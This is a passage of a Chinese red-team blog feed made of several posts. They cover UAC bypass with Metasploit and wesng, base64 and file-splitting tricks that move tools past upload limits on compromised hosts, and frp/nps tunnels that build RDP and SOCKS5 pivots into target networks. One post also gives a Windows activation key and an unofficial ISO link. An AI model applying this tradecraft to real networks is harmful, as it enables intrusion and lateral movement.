必需的组, 启用于默认, 启用的组NT AUTHORITY\This Organization       已知组 S-1-5-15     必需的组, 启用于默认, 启用的组LOCAL                                已知组 S-1-2-0      必需的组, 启用于默认, 启用的组NT AUTHORITY\NTLM Authentication     已知组 S-1-5-64-10  必需的组, 启用于默认, 启用的组Mandatory Label\High Mandatory Level 标签   S-1-16-12288 必需的组, 启用于默认, 启用的组</code></pre><p>可以看到，使用 exploit/windows/local/bypassuac_eventvwr 模块直接将目标权限提升到了 High Mandatory Level，即管理员权限，这里可以说 MSF 很方便了。</p><h3 id="wesng"><a href="#wesng" class="headerlink" title="wesng"></a>wesng</h3><p>wesng 被称为 Windows Exploit Suggester 的下一代，wesng 和 Windows Exploit Suggester 的使用方法基本一致，但 wesng 所支持的操作系统更丰富，不过实测 wesng 还未支持 Windows 11 『手动狗头』</p><p>wesng 的安装方法也很简单</p><pre><code>git clone https://github.com/bitsadmin/wesng.gitcd wesngpython wes.py --update</code></pre><p>使用起来也很简单，直接在目标主机上运行以下命令，将 systeminfo 的信息保存到 txt 中。</p><pre><code>systeminfo &gt; info.txt</code></pre><p>直接使用 wesng 即可</p><pre><code>python wes.py info.txt</code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210706145250.png"></p><p>使用 wesng 可以直接看到目标主机可能存在的 CVE 漏洞，从而便于我们有针对性的利用这些漏洞。</p><blockquote><p>参考文章：</p><p><a href="https://cloud.tencent.com/developer/article/1043370">https://cloud.tencent.com/developer/article/1043370</a></p><p><a href="https://blog.csdn.net/nathan8/article/details/108804056">https://blog.csdn.net/nathan8/article/details/108804056</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0、前言&quot;&gt;&lt;a href=&quot;#0、前言&quot; class=&quot;headerlink&quot; title=&quot;0、前言&quot;&gt;&lt;/a&gt;0、前言&lt;/h2&gt;&lt;p&gt;在内网中，往往所有主机打补丁的情况都是相似的，因此在拿下一台主机权限后，可以通过查看当前主机打补丁的情况，从而找到漏洞利用点</summary>
      
    
    
    
    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>【内网学习笔记】13、内网中绕过无法上传文件限制</title>
    <link href="https://www.teamssix.com/year/210701-161347.html"/>
    <id>https://www.teamssix.com/year/210701-161347.html</id>
    <published>2021-07-01T08:13:47.000Z</published>
    <updated>2021-07-01T13:23:56.199Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1、前言"><a href="#1、前言" class="headerlink" title="1、前言"></a>1、前言</h2><p>有次发现这样的一个情况，目标云桌面不出网且不允许上传文件但是可以复制文本，于是便想着通过 PowerShell 将 exe 程序编码成 base64 文本，将编码后的内容复制到目标主机后，再进行解码，这里记录下方法。</p><h2 id="2、PowerShell"><a href="#2、PowerShell" class="headerlink" title="2、PowerShell"></a>2、PowerShell</h2><p>使用 PowerShell 进行 base64 编码</p><pre><code>$PEBytes = [System.IO.File]::ReadAllBytes(&quot;fscan.exe&quot;)$Base64Payload = [System.Convert]::ToBase64String($PEBytes)Set-Content fscan_base64.txt -Value $Base64Payload</code></pre><p>使用 PowerShell 进行 base64 解码</p><pre><code>$Base64Bytes = Get-Content (&quot;fscan_base64.txt&quot;)$PEBytes= [System.Convert]::FromBase64String($Base64Bytes)[System.IO.File]::WriteAllBytes(&quot;fscan_base64.exe&quot;,$PEBytes)</code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210630172410.png"></p><h2 id="3、CertUtil"><a href="#3、CertUtil" class="headerlink" title="3、CertUtil"></a>3、CertUtil</h2><p>自 Windows 7 开始，Windows 自带了 CertUtil 命令，可以使用 CertUtil 进行 MD5、SHA1 等算法的计算，也可以使用 CertUtil 进行 base64 的编码，使用起来要比 PowerShell 方便不少。</p><p>使用 CertUtil 进行编码</p><pre><code>CertUtil -encode fscan.exe fscan_base64.txt</code></pre><p>使用 CertUtil 进行解码</p><pre><code>CertUtil -decode fscan_base64.txt fscan_base64.exe</code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210630173155.png"> </p><blockquote><p>参考文章：</p><p><a href="https://www.cnblogs.com/lfoder/p/8241548.html">https://www.cnblogs.com/lfoder/p/8241548.html</a></p><p><a href="https://blog.csdn.net/henter/article/details/80079531">https://blog.csdn.net/henter/article/details/80079531</a><br>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1、前言&quot;&gt;&lt;a href=&quot;#1、前言&quot; class=&quot;headerlink&quot; title=&quot;1、前言&quot;&gt;&lt;/a&gt;1、前言&lt;/h2&gt;&lt;p&gt;有次发现这样的一个情况，目标云桌面不出网且不允许上传文件但是可以复制文本，于是便想着通过 PowerShell 将 exe </summary>
      
    
    
    
    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>【内网学习笔记】两种突破内网中无法上传大文件的方法</title>
    <link href="https://www.teamssix.com/year/20210630-113201.html"/>
    <id>https://www.teamssix.com/year/20210630-113201.html</id>
    <published>2021-06-30T03:32:01.000Z</published>
    <updated>2021-07-28T05:18:10.208Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>在内网中，有时偶尔会因为种种限制，导致无法上传大文件，以至于只能上传小文件。</p><p>在前段时间就碰到了这个问题，当时在拿下目标 shell 后发现只能上传几百 K 的小文件，文件稍微大些比如几 M 的文件就会提示上传失败，在此简单记录下当时解决的办法。</p><p>针对这种情况，就需要将大文件变成小文件后再进行上传，个人觉着可以简单的分为两种方式，一种是常规的压缩文件一种是分割文件，先来看看第一种方法。</p><h1 id="0x01-压缩文件"><a href="#0x01-压缩文件" class="headerlink" title="0x01 压缩文件"></a>0x01 压缩文件</h1><p>这里以 7-Zip 为代表，其他的压缩软件还有 WinRAR 等，7-Zip 文件下载地址：<a href="https://www.7-zip.org/">https://www.7-zip.org/</a></p><p>如果目标主机没有安装 7-Zip，可以现在自己的主机上安装 7-Zip，然后把安装目录下的 7z.exe 拷贝到目标主机上，默认路径为「C:\Program Files\7-Zip\7z.exe」。</p><p>7z.exe 只有 400 多 K 的大小，可以说很是小巧了，以下为 7z.exe 的常用命令。</p><pre><code> a     添加压缩文件 x     解压压缩文件 -p    指定密码 -v    分卷压缩 -r    递归压缩 -o    指定输出目录</code></pre><h3 id="普通的压缩-解压文件"><a href="#普通的压缩-解压文件" class="headerlink" title="普通的压缩/解压文件"></a>普通的压缩/解压文件</h3><p>把 fscan.exe 压缩成 fscan.7z，压缩密码为『teamssix.com』</p><pre><code>7z.exe a -pteamssix.com fscan.7z fscan.exe</code></pre><pre><code>C:\7-Zip&gt;7z.exe a -pteamssix.com fscan.7z fscan.exe7-Zip 21.02 alpha (x64) : Copyright (c) 1999-2021 Igor Pavlov : 2021-05-06Scanning the drive:1 file, 2911744 bytes (2844 KiB)Creating archive: fscan.7zAdd new data to archive: 1 file, 2911744 bytes (2844 KiB)Files read from disk: 1Archive size: 2794266 bytes (2729 KiB)Everything is Ok</code></pre><p>把 fscan.7z 解压成 fscan.exe</p><pre><code>7z.exe x -pteamssix.com fscan.7z</code></pre><pre><code>C:\7-Zip&gt;7z.exe x -pteamssix.com fscan.7z7-Zip 21.02 alpha (x64) : Copyright (c) 1999-2021 Igor Pavlov : 2021-05-06Scanning the drive for archives:1 file, 2794266 bytes (2729 KiB)Extracting archive: fscan.7z--Path = fscan.7zType = 7zPhysical Size = 2794266Headers Size = 170Method = LZMA2:3m BCJ 7zAESSolid = -Blocks = 1Everything is OkSize:       2911744Compressed: 2794266</code></pre><p>fscan.7z 的大小是 2729 KB，fscan.exe 的大小是 2844 KB，可以看到其实大小差别也不大，没能达到我们将大文件变成小文件的目的，这种大小上传可能还是会失败，那再来试试分卷上传。</p><h3 id="分卷压缩-解压文件"><a href="#分卷压缩-解压文件" class="headerlink" title="分卷压缩/解压文件"></a>分卷压缩/解压文件</h3><p>分卷压缩其实和下面介绍的分割文件有点类似，区别还是在于一个对文件进行了压缩，一个没有进行压缩。</p><p>把 fscan.exe 以 500 K 大小进行分卷压缩。</p><pre><code>7z.exe a -pteamssix.com -v500k fscan.7z fscan.exe</code></pre><pre><code>C:\7-Zip&gt;7z.exe a -pteamssix.com -v500k fscan.7z fscan.exe7-Zip 21.02 alpha (x64) : Copyright (c) 1999-2021 Igor Pavlov : 2021-05-06Scanning the drive:1 file, 2911744 bytes (2844 KiB)Creating archive: fscan.7zAdd new data to archive: 1 file, 2911744 bytes (2844 KiB)Files read from disk: 1Archive size: 2794266 bytes (2729 KiB)Everything is Ok</code></pre><pre><code>C:\7-Zip&gt;dir 驱动器 C 中的卷没有标签。 卷的序列号是 2C2C-615D C:\7-Zip 的目录2021/06/29  21:42    &lt;DIR&gt;          .2021/06/29  21:42    &lt;DIR&gt;          ..2021/05/06  15:00           489,472 7z.exe2021/06/29  21:40           512,000 fscan.7z.0012021/06/29  21:40           512,000 fscan.7z.0022021/06/29  21:40           512,000 fscan.7z.0032021/06/29  21:40           512,000 fscan.7z.0042021/06/29  21:40           512,000 fscan.7z.0052021/06/29  21:40           234,266 fscan.7z.0062021/06/18  14:58         2,911,744 fscan.exe               8 个文件      6,195,482 字节</code></pre><p>把 fscan.7z 解压成 fscan.exe</p><pre><code>7z.exe x -pteamssix.com fscan.7z.001</code></pre><pre><code>C:\7-Zip&gt;7z.exe x -pteamssix.com fscan.7z.0017-Zip 21.02 alpha (x64) : Copyright (c) 1999-2021 Igor Pavlov : 2021-05-06Scanning the drive for archives:1 file, 512000 bytes (500 KiB)Extracting archive: fscan.7z.001--Path = fscan.7z.001Type = SplitPhysical Size = 512000Volumes = 6Total Physical Size = 2794266----Path = fscan.7zSize = 2794266--Path = fscan.7zType = 7zPhysical Size = 2794266Headers Size = 170Method = LZMA2:3m BCJ 7zAESSolid = -Blocks = 1Everything is OkSize:       2911744Compressed: 2794266</code></pre><p>可以看到，使用分卷压缩可以把一个大文件分成多个小文件，然后将小文件上传上去后，再进行解压就可以了。</p><p>但这样做感觉还是有些麻烦，直接使用下文的 split 进行文件分割个人觉着是更为方便的方法，使用 split 进行分割也是我个人解决前段时间碰到不能上传大文件问题时的方法。</p><h1 id="0x02-分割文件"><a href="#0x02-分割文件" class="headerlink" title="0x02 分割文件"></a>0x02 分割文件</h1><p>使用 split 以 500 K 大小分割 fscan.exe 文件，split 命令在 Linux 和 MAC 下都是自带的，因此在自己的电脑上分割好后，直接上传即可。</p><pre><code>split -b 500k fscan.exe teamssix</code></pre><p>合并分割文件为 fscan.exe</p><pre><code>cat teamssix* &gt; fscan            # 适用于 Linux、Maccopy /b teamssix* fscan.exe        # 适用于 Windows</code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210629220302.png"></p><p>个人觉着直接用 split 分割文件是较为方便的做法，无需第三方软件，且不论目标是 Linux 还是 Windows 都能支持。</p><blockquote><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png" alt="img"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;在内网中，有时偶尔会因为种种限制，导致无法上传大文件，以至于只能上传小文件。&lt;/p&gt;
&lt;p&gt;在前段时</summary>
      
    
    
    
    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>【随笔】Windows 11 的安装尝鲜</title>
    <link href="https://www.teamssix.com/year/210616-133645.html"/>
    <id>https://www.teamssix.com/year/210616-133645.html</id>
    <published>2021-06-16T05:36:45.000Z</published>
    <updated>2021-06-16T05:40:32.731Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>看到网上有人发 Windows 11 的安装包，心想，咦，Windows 11 都出来了？那不赶紧下载一个来尝尝鲜。</p><p>网上流传的下载地址：<a href="http://wall4.kfire.net/win11.iso">http://wall4.kfire.net/win11.iso</a></p><h1 id="0x01-安装"><a href="#0x01-安装" class="headerlink" title="0x01 安装"></a>0x01 安装</h1><p>这里以 Mac 下的 VMware Fusion 安装为例，Windows 下的操作也都类似。</p><p>首先打开 <code>VMware Fusion</code>，选择<code>新建</code></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616110553.png"></p><p>把下载好的 <code>win11.iso</code> 文件拖拽过来</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616110611.png"></p><p>拖拽过来后，会来到 <code>创建新的虚拟机</code> 界面，点击继续</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616110707.png"></p><p>接下来，选择操作系统，我这里选择的 <code>Windows 10 x64</code></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616123525.png"></p><p>选择固件类型，我这里选择的 <code>传统 BIOS</code>，亲自尝试发现选择 <code>UEFI</code> 会无法启动</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616111009.png"></p><p>接下来，虚拟机就创建完成了，但是默认分配的内存有点低，因此可以点击 <code>自定设置</code>，自己调一下配置</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616132656.png"></p><p>点击 <code>自定设置</code>后，可以修改个名字，我这里修改成了 <code>windows11</code></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616111717.png"></p><p>点击 <code>存储</code> 后，会自动打开设置界面，这里我修改了两个地方，分别是 <code>处理器和内存</code> 和 <code>硬盘（IDE）</code></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616111813.png"></p><p>打开 <code>处理器和内存</code>，我这里分配了 4 个处理器内核和 4096 MB 的内存</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616111940.png"></p><p>点击 <code>显示全部</code>，点击 <code>硬盘（IDE）</code>，我这里分配了 50 G</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616112125.png"></p><p>修改磁盘大小后，点击 <code>应用</code> ,然后关闭设置这个窗口，点击这个大大的启动按钮</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616112229.png"></p><p>启动后，可以看到 Windows 11 新的 logo</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616112434.png"></p><p>这个镜像里没有中文，所以就直接用默认的英文了，点击 <code>Next</code></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616112615.png"></p><p>点击 <code>Install now</code></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616112619.png"></p><p>接下来需要输入激活码，这里有个 Windows 11 Pro 的激活码：</p><pre><code>FKNPR-6C4GH-R3292-P4RTJ-GVJWB</code></pre><p>输入激活码，<code>Next</code> 下一步</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616123715.png"></p><p>勾选同意，<code>Next</code> 即可</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616113117.png"></p><p>选择 <code>Custom</code>，自定义安装</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616113230.png"></p><p><code>New</code> 一个分区，点击 <code>New</code> 后，再点击 <code>Apply</code> 应用一下，不过貌似直接 <code>Next</code> 也可以</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616113639.png"></p><p>点击 <code>Apply</code>后会有个通知，点击确认就行， 然后点击 <code>Next</code> 就开始安装了</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616113826.png"></p><p>接下来，等它安装完成就行了。</p><h1 id="0x02-使用"><a href="#0x02-使用" class="headerlink" title="0x02 使用"></a>0x02 使用</h1><p>安装完成后，选择国家和地区，这里选择了中国</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616123935.png"></p><p>选择键盘布局，这里就直接默认了</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616124044.png"></p><p>询问是否要再添加一个键盘，这里就直接跳过了</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616124155.png"></p><p>接下来，系统会检查更新，检查完成后，输入自己的名字</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616124458.png"></p><p>然后输入密码，之后再设置三个安全问题，接受隐私协议，最后等待几分钟</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616124739.png"></p><p>最后，就进入桌面了</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616124854.png"></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616125657.png"></p><h1 id="0x03-最后"><a href="#0x03-最后" class="headerlink" title="0x03 最后"></a>0x03 最后</h1><p>单纯就外观来看，变化不算小，而且窗口的打开关闭也有了动画过渡，UI 变得更好看了，同时操作逻辑还是原来的逻辑，上手也不会有什么难度，值得一提的是，目前还没遇到什么 bug，这点挺不错的。</p><p>但是再多打开几个窗口，比如说 CMD、计算机管理什么的，还是可以看到很多当年 Win7 的影子，看来 Win11 依然还是一个两种设计语言并存的系统。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616130923.jpg"></p><p>从最早的 xp，到 7、8、10 一直到 11 ，不得不说 Windows 确实是变得越来越好看了，现在的 Windows 给我的感觉就是微软有品味了但又不完全有，希望 Windows 继续努力吧，我还是继续用我的 Mac 了。</p><blockquote><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;看到网上有人发 Windows 11 的安装包，心想，咦，Windows 11 都出来了？那不赶紧下</summary>
      
    
    
    
    <category term="随笔" scheme="https://www.teamssix.com/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
    <category term="Windows 11" scheme="https://www.teamssix.com/tags/Windows-11/"/>
    
    <category term="尝鲜" scheme="https://www.teamssix.com/tags/%E5%B0%9D%E9%B2%9C/"/>
    
  </entry>
  
  <entry>
    <title>【内网学习笔记】12、nps 的使用</title>
    <link href="https://www.teamssix.com/year/210612-213704.html"/>
    <id>https://www.teamssix.com/year/210612-213704.html</id>
    <published>2021-06-12T13:37:04.000Z</published>
    <updated>2021-06-12T13:45:48.068Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1、介绍"><a href="#1、介绍" class="headerlink" title="1、介绍"></a>1、介绍</h2><p>nps 项目地址：<a href="https://github.com/ehang-io/nps">https://github.com/ehang-io/nps</a></p><p>也是一款还在更新的内网穿透工具，相较于 frp，nps 的 web 管理就要强大很多了。</p><p>nps 和 frp 一样功能都很多，这里就主要记录下平时经常用到的 SOCKS5 代理模式。</p><h2 id="2、安装"><a href="#2、安装" class="headerlink" title="2、安装"></a>2、安装</h2><p>nps 不同于 frp 的开箱即用，nps 的服务端需要安装才能使用，这里以 kali 下的安装为例。</p><p>在 nps 项目的 releases 中下载好自己对应系统的版本后，解压安装</p><pre><code>tar -zxvf linux_amd64_server.tar.gz./nps install</code></pre><h2 id="3、使用"><a href="#3、使用" class="headerlink" title="3、使用"></a>3、使用</h2><p>官方使用文档：<a href="https://ehang-io.github.io/nps">https://ehang-io.github.io/nps</a></p><p>启动服务端，默认 Web 管理界面端口 8080 </p><pre><code>nps start</code></pre><p>启动 nps 后，直接访问服务端的 8080 端口，输入默认密码 admin/123 进行登录，不难看出，这 web 界面确实比 frp 的丰富很多。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210609170306.png"></p><p>nps 的使用也很简单，界面语言也可选择中文。</p><p>首先新增一个客户端，点击 “客户端” –》“新增”，打开新增客户端页面，填写相关信息后，点击新增即可</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210609171610.png"></p><p>新增之后，刷新一下可以看到刚刚添加的记录，点击刚刚新增记录里的“加号”还能直接看到在客户端上要运行的命令，这个可谓是很贴心了。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210609172254.png"></p><p>复制命令到客户端上运行，服务端这边就能看到目标已经上线了，连接状态也由离线变成了在线。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210609172144.png"></p><p>如果想创建一个 SOCKS5 代理也很简单，直接点击 “SOCKS 代理”–》“新增”，输入客户端的 ID 和代理的端口，然后新增即可。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210609172512.png"></p><p>之后直接设置 SOCKS5 代理 IP 为 nps 服务端 IP ，端口这里设置的是 1080，这样就建立了一个 SOCKS 代理，如果新增设置客户端的时候，设置了认证账号密码，那么在连接 SOCKS 代理的时候，也要添加上对应的账号和密码。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210609173211.png"></p><p>在这整个过程中都没有修改配置文件等等操作，真的是很方便了。</p><blockquote><p>参考文章：</p><p><a href="https://ehang-io.github.io/nps/">https://ehang-io.github.io/nps/</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1、介绍&quot;&gt;&lt;a href=&quot;#1、介绍&quot; class=&quot;headerlink&quot; title=&quot;1、介绍&quot;&gt;&lt;/a&gt;1、介绍&lt;/h2&gt;&lt;p&gt;nps 项目地址：&lt;a href=&quot;https://github.com/ehang-io/nps&quot;&gt;https://git</summary>
      
    
    
    
    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>【内网学习笔记】11、frp 的使用</title>
    <link href="https://www.teamssix.com/year/210611-171526.html"/>
    <id>https://www.teamssix.com/year/210611-171526.html</id>
    <published>2021-06-11T09:15:26.000Z</published>
    <updated>2021-07-15T02:00:26.453Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1、介绍"><a href="#1、介绍" class="headerlink" title="1、介绍"></a>1、介绍</h2><p>相较于前一篇文章介绍的 ew 的年代久远，frp 就好的多了，基本上隔几天就会发布新的版本，最新的一版更新还就在几天前。</p><p>在实战中，大家较多使用的也是 frp，frp 项目地址：<a href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></p><p>至于下载安装直接在项目的 releases 里下载自己对应的系统版本就行。</p><h2 id="2、使用"><a href="#2、使用" class="headerlink" title="2、使用"></a>2、使用</h2><p>官方使用文档：<a href="https://gofrp.org/docs/">https://gofrp.org/docs/</a></p><p>frp 分成服务端和客户端，分别叫 frps 和 frpc，配置文件分别对应 frps.ini 和 frpc.ini</p><blockquote><p>以下环境均为本地环境，VPS IP 为 172.16.214.52，目标主机 IP 为 192.168.7.110</p></blockquote><h3 id="a、内网端口穿透"><a href="#a、内网端口穿透" class="headerlink" title="a、内网端口穿透"></a>a、内网端口穿透</h3><p> 场景：内网主机可出网，想从公网访问内网主机的 3389 端口</p><p>在 VPS 上开启服务端，这里以 kali 为例，首先修改配置文件 frps.ini</p><pre><code>[common]bind_port = 4444</code></pre><p>然后启动服务端</p><pre><code>frps -c frps.ini</code></pre><pre><code>&gt; ./frps -c frps.ini2021/06/09 03:45:03 [I] [root.go:200] frps uses config file: frps.ini2021/06/09 03:45:03 [I] [service.go:192] frps tcp listen on 0.0.0.0:44442021/06/09 03:45:03 [I] [root.go:209] frps started successfully</code></pre><p>配置客户端配置文件</p><pre><code>[common]# 服务端 IPserver_addr = vps_ip# 服务端端口server_port = 4444[rdp]type = tcplocal_ip = 127.0.0.1local_port = 3389# 连接 vps 的端口remote_port = 3389</code></pre><pre><code>&gt; .\frpc.exe -c frpc.ini2021/06/09 15:50:29 [I] [service.go:304] [72904e8037a7fdf8] login to server success, get run id [72904e8037a7fdf8], server udp port [0]2021/06/09 15:50:29 [I] [proxy_manager.go:144] [72904e8037a7fdf8] proxy added: [rdp]2021/06/09 15:50:29 [I] [control.go:180] [72904e8037a7fdf8] [rdp] start proxy success</code></pre><p>此时，在 vps 上访问本地的 3389 端口就会访问到内网主机的 3389 端口了。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210609155435.png"></p><h3 id="b、建立-socks-代理"><a href="#b、建立-socks-代理" class="headerlink" title="b、建立 socks 代理"></a>b、建立 socks 代理</h3><p>场景：内网主机可出网，想把内网主机作为跳板机使用</p><p>上面的场景只是利用 frp 访问了内网指定机器的指定端口，我们还可以利用 frp 将内网主机作为跳板机使用。</p><p>这次我们用上 frp 的 web 控制面板以及访问密码等功能，让我们建立的连接更加安全、方便。</p><p>在 VPS 上开启服务端，服务端配置文件如下：</p><pre><code>[common]bind_port = 4444# 客户端认证 tokentoken = 123456# 设置 frps 仪表盘端口、账号和密码，实战中用处貌似不大，但如果设置一定要设置强密码dashboard_port = 8000dashboard_user = admindashboard_pwd = password</code></pre><blockquote><p>实战中，为了更好的隐藏自己，最好还是要设置通过域名访问</p></blockquote><p>配置好文件后，启动服务端</p><pre><code>frps -c frps.ini</code></pre><pre><code>./frps -c frps.ini2021/06/09 04:06:34 [I] [root.go:200] frps uses config file: frps.ini2021/06/09 04:06:35 [I] [service.go:192] frps tcp listen on 0.0.0.0:44442021/06/09 04:06:35 [I] [service.go:294] Dashboard listen on 0.0.0.0:80002021/06/09 04:06:35 [I] [root.go:209] frps started successfully</code></pre><p>配置客户端文件</p><pre><code>[common]server_addr = vps_ipserver_port = 4444# 客户端认证 token，需要和服务端 token 保持一致token = 123456# 启用加密，防止流量被拦截use_encryption = true# 启用压缩，提升流量转发速度use_compression = true[socks5]type = tcp# 连接 vps 的端口remote_port = 1080plugin = socks5</code></pre><p>开启客户端</p><pre><code>frpc -c frpc.ini</code></pre><pre><code>&gt; .\frpc.exe -c frpc.ini2021/06/09 16:11:21 [I] [service.go:304] [ee7ad330ab4e6036] login to server success, get run id [ee7ad330ab4e6036], server udp port [0]2021/06/09 16:11:21 [I] [proxy_manager.go:144] [ee7ad330ab4e6036] proxy added: [socks5]2021/06/09 16:11:21 [I] [control.go:180] [ee7ad330ab4e6036] [socks5] start proxy success</code></pre><p>测试 VPS IP 的 1080 的 socks5 代理，发现已经连通了。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210609161458.png"></p><p>打开 frps 仪表盘，登录后，可以看到当前连接数据的相关信息</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210609161859.png"></p><p>frp 的参数远不止文章中提到的这些，更多功能可以参考下面的参考文章。</p><blockquote><p>参考文章：</p><p><a href="https://www.jianshu.com/p/331aa59fff5d">https://www.jianshu.com/p/331aa59fff5d</a></p><p><a href="https://www.anquanke.com/post/id/184855">https://www.anquanke.com/post/id/184855</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
